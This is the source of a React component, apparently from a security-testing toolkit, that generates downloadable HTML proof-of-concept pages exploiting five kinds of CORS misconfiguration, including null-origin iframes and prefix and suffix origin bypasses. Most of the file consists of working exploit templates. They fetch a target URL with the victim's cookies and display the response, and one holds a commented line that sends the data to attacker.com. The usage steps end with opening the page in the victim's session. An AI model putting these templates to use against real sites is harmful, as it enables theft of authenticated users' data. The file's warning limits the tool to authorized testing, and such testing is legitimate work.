import React, { useState } from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faCode, faCopy, faDownload, faPlay } from '@fortawesome/free-solid-svg-icons';

export type CorsExploitGeneratorData = {
  targetUrl?: string;
  exploitType?: CorsExploitType;
  generatedCode?: string;
  withCredentials?: boolean;
  customOrigin?: string;
};

type CorsExploitType =
  | 'reflected-origin'
  | 'null-origin'
  | 'wildcard-subdomain'
  | 'prefix-match'
  | 'suffix-match';

type Props = {
  data: CorsExploitGeneratorData | undefined;
  onChange: (data: CorsExploitGeneratorData) => void;
};

const EXPLOIT_TYPES: { value: CorsExploitType; label: string; description: string }[] = [
  {
    value: 'reflected-origin',
    label: 'Reflected Origin',
    description: 'Server reflects the Origin header in ACAO'
  },
  {
    value: 'null-origin',
    label: 'Null Origin',
    description: 'Server accepts null origin (sandboxed iframes)'
  },
  {
    value: 'wildcard-subdomain',
    label: 'Wildcard Subdomain',
    description: 'Server accepts *.target.com pattern'
  },
  {
    value: 'prefix-match',
    label: 'Prefix Match Bypass',
    description: 'Server only checks origin prefix'
  },
  {
    value: 'suffix-match',
    label: 'Suffix Match Bypass',
    description: 'Server only checks origin suffix'
  }
];

const generateExploitCode = (
  targetUrl: string,
  exploitType: CorsExploitType,
  withCredentials: boolean,
  customOrigin?: string
): string => {
  const credentialsAttr = withCredentials ? '\n    credentials: "include",' : '';

  switch (exploitType) {
    case 'reflected-origin':
      return `<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC - Reflected Origin</title>
</head>
<body>
  <h2>CORS Exploit - Reflected Origin</h2>
  <div id="result">Loading...</div>

  <script>
    // Target URL vulnerable to reflected origin
    const targetUrl = "${targetUrl}";

    fetch(targetUrl, {
      method: "GET",${credentialsAttr}
      mode: "cors"
    })
    .then(response => response.text())
    .then(data => {
      document.getElementById("result").innerHTML =
        "<pre>" + data.substring(0, 1000) + "</pre>";
      // Send to attacker server
      // fetch("https://attacker.com/log?data=" + encodeURIComponent(data));
    })
    .catch(err => {
      document.getElementById("result").textContent = "Error: " + err.message;
    });
  </script>
</body>
</html>`;

    case 'null-origin':
      return `<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC - Null Origin</title>
</head>
<body>
  <h2>CORS Exploit - Null Origin (via sandboxed iframe)</h2>
  <div id="result">Loading...</div>

  <!-- Sandboxed iframe sends null origin -->
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms"
          srcdoc='
    <script>
      const targetUrl = "${targetUrl}";
      fetch(targetUrl, {
        method: "GET",${credentialsAttr}
        mode: "cors"
      })
      .then(response => response.text())
      .then(data => {
        parent.postMessage({type: "cors-data", data: data}, "*");
      })
      .catch(err => {
        parent.postMessage({type: "cors-error", error: err.message}, "*");
      });
    </script>
  '></iframe>

  <script>
    window.addEventListener("message", function(e) {
      if (e.data.type === "cors-data") {
        document.getElementById("result").innerHTML =
          "<pre>" + e.data.data.substring(0, 1000) + "</pre>";
      } else if (e.data.type === "cors-error") {
        document.getElementById("result").textContent = "Error: " + e.data.error;
      }
    });
  </script>
</body>
</html>`;

    case 'wildcard-subdomain':
      const domain = customOrigin || 'evil.target.com';
      return `<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC - Wildcard Subdomain</title>
</head>
<body>
  <h2>CORS Exploit - Wildcard Subdomain</h2>
  <p>Host this on: ${domain}</p>
  <div id="result">Loading...</div>

  <script>
    // This page should be hosted on a subdomain like evil.target.com
    // if the server accepts *.target.com
    const targetUrl = "${targetUrl}";

    fetch(targetUrl, {
      method: "GET",${credentialsAttr}
      mode: "cors"
    })
    .then(response => response.text())
    .then(data => {
      document.getElementById("result").innerHTML =
        "<pre>" + data.substring(0, 1000) + "</pre>";
    })
    .catch(err => {
      document.getElementById("result").textContent = "Error: " + err.message;
    });
  </script>
</body>
</html>`;

    case 'prefix-match':
      const targetDomain = new URL(targetUrl).hostname;
      const attackerDomain = customOrigin || `${targetDomain}.attacker.com`;
      return `<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC - Prefix Match Bypass</title>
</head>
<body>
  <h2>CORS Exploit - Prefix Match Bypass</h2>
  <p>Host this on: ${attackerDomain}</p>
  <p>If server only checks if origin starts with "${targetDomain}"</p>
  <div id="result">Loading...</div>

  <script>
    // This exploits servers that only check the prefix of the origin
    // e.g., checking if origin starts with "target.com"
    // Host this on: ${attackerDomain}
    const targetUrl = "${targetUrl}";

    fetch(targetUrl, {
      method: "GET",${credentialsAttr}
      mode: "cors"
    })
    .then(response => response.text())
    .then(data => {
      document.getElementById("result").innerHTML =
        "<pre>" + data.substring(0, 1000) + "</pre>";
    })
    .catch(err => {
      document.getElementById("result").textContent = "Error: " + err.message;
    });
  </script>
</body>
</html>`;

    case 'suffix-match':
      const target = new URL(targetUrl).hostname;
      const attacker = customOrigin || `attacker${target}`;
      return `<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC - Suffix Match Bypass</title>
</head>
<body>
  <h2>CORS Exploit - Suffix Match Bypass</h2>
  <p>Host this on: ${attacker}</p>
  <p>If server only checks if origin ends with "${target}"</p>
  <div id="result">Loading...</div>

  <script>
    // This exploits servers that only check the suffix of the origin
    // e.g., checking if origin ends with "target.com"
    // Host this on: ${attacker}
    const targetUrl = "${targetUrl}";

    fetch(targetUrl, {
      method: "GET",${credentialsAttr}
      mode: "cors"
    })
    .then(response => response.text())
    .then(data => {
      document.getElementById("result").innerHTML =
        "<pre>" + data.substring(0, 1000) + "</pre>";
    })
    .catch(err => {
      document.getElementById("result").textContent = "Error: " + err.message;
    });
  </script>
</body>
</html>`;

    default:
      return '<!-- Select an exploit type to generate code -->';
  }
};

const CorsExploitGenerator: React.FC<Props> = ({ data, onChange }) => {
  const targetUrl = data?.targetUrl ?? '';
  const exploitType = data?.exploitType ?? 'reflected-origin';
  const withCredentials = data?.withCredentials ?? true;
  const customOrigin = data?.customOrigin ?? '';
  const [copied, setCopied] = useState(false);

  const generatedCode = targetUrl.trim()
    ? generateExploitCode(targetUrl, exploitType, withCredentials, customOrigin)
    : '';

  const handleCopy = () => {
    navigator.clipboard.writeText(generatedCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleDownload = () => {
    const blob = new Blob([generatedCode], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `cors-poc-${exploitType}.html`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const handleUseCurrentPage = () => {
    onChange({ ...data, targetUrl: window.location.href });
  };

  return (
    <div className="flex flex-col h-full">
      <div className="flex items-center justify-between mb-3">
        <div className="text-xs text-slate-200">CORS Exploit Generator</div>
        <div className="flex gap-2">
          <button
            onClick={handleUseCurrentPage}
            className="rounded bg-slate-800 px-2 py-1 text-[10px] text-slate-300 hover:bg-slate-700 transition-colors"
          >
            Current URL
          </button>
        </div>
      </div>

      <div className="text-[10px] text-slate-500 mb-3">
        Generates CORS exploitation PoC code for different vulnerability types.
      </div>

      <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-3">
        <label className="text-[10px] text-slate-500 mb-1 block">Target URL</label>
        <input
          type="url"
          value={targetUrl}
          onChange={(e) => onChange({ ...data, targetUrl: e.target.value })}
          placeholder="https://vulnerable.com/api/sensitive-data"
          className="w-full rounded bg-slate-800 text-slate-200 text-[11px] px-2 py-1 border border-slate-700 focus:outline-none focus:border-blue-500"
        />
      </div>

      <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-3">
        <label className="text-[10px] text-slate-500 mb-1 block">Exploit Type</label>
        <select
          value={exploitType}
          onChange={(e) => onChange({ ...data, exploitType: e.target.value as CorsExploitType })}
          className="w-full rounded bg-slate-800 text-slate-200 text-[11px] px-2 py-1 border border-slate-700 focus:outline-none focus:border-blue-500"
        >
          {EXPLOIT_TYPES.map(type => (
            <option key={type.value} value={type.value}>
              {type.label}
            </option>
          ))}
        </select>
        <div className="text-[9px] text-slate-500 mt-1">
          {EXPLOIT_TYPES.find(t => t.value === exploitType)?.description}
        </div>
      </div>

      <div className="flex items-center gap-4 mb-3">
        <label className="flex items-center gap-2 text-[10px] text-slate-300">
          <input
            type="checkbox"
            checked={withCredentials}
            onChange={(e) => onChange({ ...data, withCredentials: e.target.checked })}
            className="rounded bg-slate-700 border-slate-600"
          />
          Include Credentials (cookies)
        </label>
      </div>

      {(exploitType === 'wildcard-subdomain' || exploitType === 'prefix-match' || exploitType === 'suffix-match') && (
        <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-3">
          <label className="text-[10px] text-slate-500 mb-1 block">Custom Attacker Origin</label>
          <input
            type="text"
            value={customOrigin}
            onChange={(e) => onChange({ ...data, customOrigin: e.target.value })}
            placeholder="evil.target.com"
            className="w-full rounded bg-slate-800 text-slate-200 text-[11px] px-2 py-1 border border-slate-700 focus:outline-none focus:border-blue-500"
          />
        </div>
      )}

      {generatedCode && (
        <div className="flex-1 overflow-hidden flex flex-col min-h-0 mb-3">
          <div className="flex items-center justify-between mb-2">
            <label className="text-[10px] text-slate-400">Generated PoC Code</label>
            <div className="flex gap-2">
              <button
                onClick={handleCopy}
                className="rounded bg-slate-800 px-2 py-1 text-[10px] text-slate-300 hover:bg-slate-700 transition-colors flex items-center gap-1"
              >
                <FontAwesomeIcon icon={faCopy} className="w-2.5 h-2.5" />
                {copied ? 'Copied!' : 'Copy'}
              </button>
              <button
                onClick={handleDownload}
                className="rounded bg-slate-800 px-2 py-1 text-[10px] text-slate-300 hover:bg-slate-700 transition-colors flex items-center gap-1"
              >
                <FontAwesomeIcon icon={faDownload} className="w-2.5 h-2.5" />
                Download
              </button>
            </div>
          </div>
          <pre className="text-[10px] text-slate-300 bg-slate-800/50 p-2 rounded border border-slate-700 overflow-auto flex-1 font-mono">
            {generatedCode}
          </pre>
        </div>
      )}

      <div className="text-[10px] text-slate-500 border-t border-slate-700 pt-3 space-y-1">
        <div><strong>Usage:</strong></div>
        <ol className="list-decimal list-inside ml-2 space-y-0.5 text-[9px]">
          <li>Enter the vulnerable URL</li>
          <li>Select the CORS misconfiguration type</li>
          <li>Download the HTML file</li>
          <li>Host it on the appropriate domain</li>
          <li>Open in a browser with the victim&apos;s session</li>
        </ol>
      </div>

      <div className="rounded border border-yellow-500/30 bg-yellow-900/20 p-2 mt-3 text-[10px] text-yellow-400">
        <strong>Warning:</strong> This tool is for authorized security testing only.
        Unauthorized use may violate laws and terms of service.
      </div>
    </div>
  );
};

export class CorsExploitGeneratorTool {
  static Component = CorsExploitGenerator;
}
